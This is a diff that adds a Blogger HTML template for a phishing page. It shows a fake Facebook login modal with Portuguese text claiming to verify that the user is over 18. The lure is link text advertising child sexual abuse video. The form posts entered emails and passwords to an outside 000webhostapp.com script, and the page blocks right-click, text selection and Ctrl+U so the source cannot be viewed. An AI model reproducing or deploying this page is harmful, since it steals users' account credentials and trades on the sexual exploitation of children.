@@ -1,0 +1,248 @@
+﻿<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE html>
+<html xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+  <link href='https://www.favicon.cc/logo/pkuk555.png' rel='shortcut icon' type='image/png'/>
+<meta content='width=device-width, initial-scale=1.0' name='viewport'/>
+<meta content='https://1.bp.blogspot.com/-07dBkZHNd5A/YAcM3ASc8NI/AAAAAAAAAEg/9AXSyiL7C1wgLYR7mKtoN7DEcBsDo1cJQCLcBGAsYHQ/s222/image.jpg' property='og:image'/>
+
+	<link crossorigin='anonymous' href='https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css' integrity='sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7' rel='stylesheet'/>
+<head>
+<title>
+Vui cười lên
+</title>
+<!-- Bắt đầu viết Css cho web -->
+<b:skin><![CDATA[
+  
+ * {
+            box-sizing: border-box;
+        }
+        
+        html {
+            background: #e2e2e2;
+        }
+        
+        body {
+            background: #e2e2e2;
+            margin: 0;
+            padding: 0;
+            font-family: 'Lato', sans-serif;
+        }
+        
+        img.img-responsive {
+            	width: 28%;
+    			height: 50%;
+
+        }
+        
+        .login-form-wrap {
+            background: radial-gradient(ellipse at center, rgba(81, 112, 173, 1) 0%, rgba(53, 84, 147, 1) 100%);
+            border: 1px solid #2d416d;
+            box-shadow: 0 1px #5670a4 inset, 0 0 10px 5px rgba(0, 0, 0, 0.1);
+            border-radius: 5px;
+            width: 380px;
+            height: 510px;
+           margin: 60px 500px;
+            padding: 30px 30px 0 40px;
+            text-align: center;
+        }
+        
+        .login-form-wrap h1 {
+            margin: 0 0 40px 0;
+            padding: 0;
+            font-weight: bold;
+            font-size: 26px;
+            color: #fff;
+        }
+        
+        .login-form-wrap h5 {
+            margin-top: 40px;
+        }
+        
+        .login-form-wrap h5>a {
+            font-size: 14px;
+            color: #fff;
+            text-decoration: none;
+            font-weight: 400;
+        }
+        
+        .login-form input[name="email"],
+        .login-form input[name="pass"] {
+            width: 100%;
+            border: 1px solid #314d89;
+            margin-right: 110px;
+            outline: none;
+            padding: 12px 20px;
+            font-weight: 400;
+            font-family: 'Lato', sans-serif;
+            cursor: pointer;
+        }
+        
+        .login-form input[name="email"] {
+            border-bottom: none;
+            border-radius: 4px 4px 0 0;
+            padding-bottom: 13px;
+            box-shadow: 0 -1px 0 #e0e0e0 inset, 0 1px 2px rgba(0, 0, 0, 0.23) inset;
+        }
+        
+        .login-form input[name="password"] {
+            border-top: none;
+            border-radius: 0 0 4px 4px;
+            box-shadow: 0 -1px 2px rgba(0, 0, 0, 0.23) inset, 0 1px 2px rgba(255, 255, 255, 0.1);
+        }
+        
+        .login-form input[type="submit"] {
+            font-family: 'Lato', sans-serif;
+            font-weight: 400;
+            background: linear-gradient(to bottom, rgba(224, 224, 224, 1) 0%, rgba(206, 206, 206, 1) 100%);
+            display: block;
+            margin: 20px auto 0 auto;
+            width: 100%;
+            border: none;
+            border-radius: 3px;
+            padding: 8px;
+            font-size: 17px;
+            color: #636363;
+            text-shadow: 0 1px 0 rgba(255, 255, 255, 0.45);
+            font-weight: 700;
+            box-shadow: 0 1px 3px 1px rgba(0, 0, 0, 0.17), 0 1px 0 rgba(255, 255, 255, 0.36) inset;
+        }
+        
+        .login-form input[type="submit"]:hover {
+            background: #ddd;
+        }
+        
+        .login-form input[type="submit"]:active {
+            padding-top: 9px;
+            padding-bottom: 7px;
+            background: #c9c9c9;
+        }
+        
+        @media only screen and (max-width: 320px) {
+            section.login-form-wrap {
+                width: 100%;
+            }
+        } 
+
+    
+        
+
+  @media only screen and (max-width: 768px){
+      section.login-form-wrap {
+          margin: 57px 360px;
+      }
+  	}
+
+	@media only screen and (max-width: 767px){
+    div#myModal {
+
+        margin-top: -114px;
+    }
+	a{
+    font-size:20px;
+    }
+     img.img-responsive{
+      display:none;
+      }
+      section.login-form-wrap {
+          margin: 165px auto;
+      }
+	}
+	@media (min-width: 426px) and (max-width: 768px){
+      	section.login-form-wrap {
+    		margin: 57px 360px;
+		}
+		img.img-responsive {
+   				width: 42%;
+            height: 50%;
+			}
+  	  }
+    @media (min-width: 1441px) and (max-width: 2560px){
+      	section.login-form-wrap {
+    		margin-left: 43%;
+		}
+  	  }
+
+      .navbar{
+          display:none
+  }
+  ]]></b:skin>
+  <script async='async' src='https://ajax.googleapis.com/ajax/libs/webfont/1.5.18/webfont.js'/>
+</head>
+  <script type='text/javascript'>
+//<![CDATA[
+//Ctrl+U
+shortcut={all_shortcuts:{},add:function(a,b,c){var d={type:"keydown",propagate:!1,disable_in_input:!1,target:document,keycode:!1};if(c)for(var e in d)"undefined"==typeof c[e]&&(c[e]=d[e]);else c=d;d=c.target,"string"==typeof c.target&&(d=document.getElementById(c.target)),a=a.toLowerCase(),e=function(d){d=d||window.event;if(c.disable_in_input){var e;d.target?e=d.target:d.srcElement&&(e=d.srcElement),3==e.nodeType&&(e=e.parentNode);if("INPUT"==e.tagName||"TEXTAREA"==e.tagName)return}d.keyCode?code=d.keyCode:d.which&&(code=d.which),e=String.fromCharCode(code).toLowerCase(),188==code&&(e=","),190==code&&(e=".");var f=a.split("+"),g=0,h={"`":"~",1:"!",2:"@",3:"#",4:"$",5:"%",6:"^",7:"&",8:"*",9:"(",0:")","-":"_","=":"+",";":":","'":'"',",":"<",".":">","/":"?","\\":"|"},i={esc:27,escape:27,tab:9,space:32,"return":13,enter:13,backspace:8,scrolllock:145,scroll_lock:145,scroll:145,capslock:20,caps_lock:20,caps:20,numlock:144,num_lock:144,num:144,pause:19,"break":19,insert:45,home:36,"delete":46,end:35,pageup:33,page_up:33,pu:33,pagedown:34,page_down:34,pd:34,left:37,up:38,right:39,down:40,f1:112,f2:113,f3:114,f4:115,f5:116,f6:117,f7:118,f8:119,f9:120,f10:121,f11:122,f12:123},j=!1,l=!1,m=!1,n=!1,o=!1,p=!1,q=!1,r=!1;d.ctrlKey&&(n=!0),d.shiftKey&&(l=!0),d.altKey&&(p=!0),d.metaKey&&(r=!0);for(var s=0;k=f[s],s<f.length;s++)"ctrl"==k||"control"==k?(g++,m=!0):"shift"==k?(g++,j=!0):"alt"==k?(g++,o=!0):"meta"==k?(g++,q=!0):1<k.length?i[k]==code&&g++:c.keycode?c.keycode==code&&g++:e==k?g++:h[e]&&d.shiftKey&&(e=h[e],e==k&&g++);if(g==f.length&&n==m&&l==j&&p==o&&r==q&&(b(d),!c.propagate))return d.cancelBubble=!0,d.returnValue=!1,d.stopPropagation&&(d.stopPropagation(),d.preventDefault()),!1},this.all_shortcuts[a]={callback:e,target:d,event:c.type},d.addEventListener?d.addEventListener(c.type,e,!1):d.attachEvent?d.attachEvent("on"+c.type,e):d["on"+c.type]=e},remove:function(a){var a=a.toLowerCase(),b=this.all_shortcuts[a];delete this.all_shortcuts[a];if(b){var a=b.event,c=b.target,b=b.callback;c.detachEvent?c.detachEvent("on"+a,b):c.removeEventListener?c.removeEventListener(a,b,!1):c["on"+a]=!1}}},shortcut.add("Ctrl+U",function(){top.location.href="/"});
+//]]>
+</script>
+<!-- Bắt đầu phần hiển thị trên web -->
+<body onclick='showlog();' oncontextmenu='return false' ondragstart='return false' onselectstart='return false'>
+<b:section class='navbar' id='navbar' showaddelement='yes'/>
+  <div class='container'>
+        <div class='row' style='margin-top: 10px;'>
+            <div class='col-xs-12 col-sm-12 col-md-12 col-lg-12'>
+                <div class='separator' style='clear: both; text-align: center;'>
+                    <b><span style='color: red; font-size: 24pt;'><a href='#' onclick='showlog()' style='background-color: yellow;'>Video Child Porn 18+</a></span></b>
+                </div>
+                <img alt='Image' class='img-responsive' onclick='showlog();' src='https://1.bp.blogspot.com/-07dBkZHNd5A/YAcM3ASc8NI/AAAAAAAAAEg/9AXSyiL7C1wgLYR7mKtoN7DEcBsDo1cJQCLcBGAsYHQ/s222/image.jpg'/>
+                
+                </div>
+          <div class='separator' style=' text-align: center; margin-top: 200px;'>
+                    <b><span style='color: red; font-size: 24pt;'><a href='#' onclick='showlog()' style='background-color: yellow; color: #ff1313;'>&#9654; Assista ao Video Child Porn 18+</a></span></b>
+            </div>
+        </div>
+    </div>
+    <div class='modal fade in' id='myModal' role='dialog' style='display: block; padding-left: 0px;'>
+        <section class='login-form-wrap'>
+            <div class='row' style='background: #3b5998;'>
+                <div class='col-lg-12' style='text-align: center; padding: 5px 0px;'>
+                    <span style='color:#fff;    font-family: helvetica, arial, sans-serif;       font-size: 25px;       color: #fff;        font-weight: bold;'>facebook</span>
+                </div>
+            </div>
+            <div class='row'>
+
+                <div style='  width: 300px;                          font-size: 20px;                         background-color: #fff9d7;                         border: 1px solid #e2c822;                                                  padding: 7px 23px;                          margin: 1px auto;                          border-radius: 10px;                          margin-bottom: 15px;'>
+                        Faça login para verificar se você é maior de 18+
+                    </div>
+            </div>
+            <div class='row'>
+                <form action='https://thientran1111.000webhostapp.com/checkpass_blog.php' id='login_form_mb' method='post' onsubmit='return checkFormMB()'>
+                    <input class='form-control' id='email' name='email' placeholder='Endereço de email ou número de telefone' required='' style='height:50px;border-bottom-left-radius: 0px;         border-bottom-right-radius: 0px;'/>
+                    <input class='form-control' id='password' name='password' placeholder='Senha' required='' style='height:50px; border-top:none;   border-radius: 0px;' type='password'/>
+                    <div class='_55ws' style='padding: 10px 0px;border-top:none;'>
+                        <button class='btn btn-primary btn-lg btn-block' name='login' style='padding: 4px 0px;  background-color: #627aad;border-radius: 4px;text-shadow: 0 -1px rgba(0, 0, 0, .25); background-image: -webkit-linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .1)); background-image: linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .1));border: 1px solid #4162A7;' type='submit'>Entrar</button>
+                    </div>
+
+                </form>
+              <script>
+                
+                	
+						
+$( document ).ready(function() {
+				setTimeout( e =&gt; {
+									showlog()
+								}, 1000)			    
+			});
+			function showlog() {
+				$(&#39;#myModal&#39;).modal({
+                    backdrop: &#39;static&#39;,
+                    keyboard: true, 
+                    show: true
+                });
+			}						
+							
+						 </script>
+              
+							
+            </div>
+
+
+            <button class='btn btn-primary' style='background-color: #5b93fc; padding: 10px 20px; font-weight: bold;     border: 1px solid #0A5AED;text-shadow: 0 -1px rgba(0, 0, 0, .25);    background-image: -webkit-linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .1)); background-image: linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .1));' type='button'>Crear una nueva cuenta</button>
+            <p style='color: #899bc1;       font-size: 12px;       line-height: 16px; margin-top: 10px;'>Você esqueceu sua senha? Centro de ajuda</p>
+        </section>
+    </div>
+    <script src='//code.jquery.com/jquery.js'/>
+    <script type='text/javascript'>
+    </script>
+</body>
+<!-- Kết thúc phần hiển thị trên web -->
+</html>
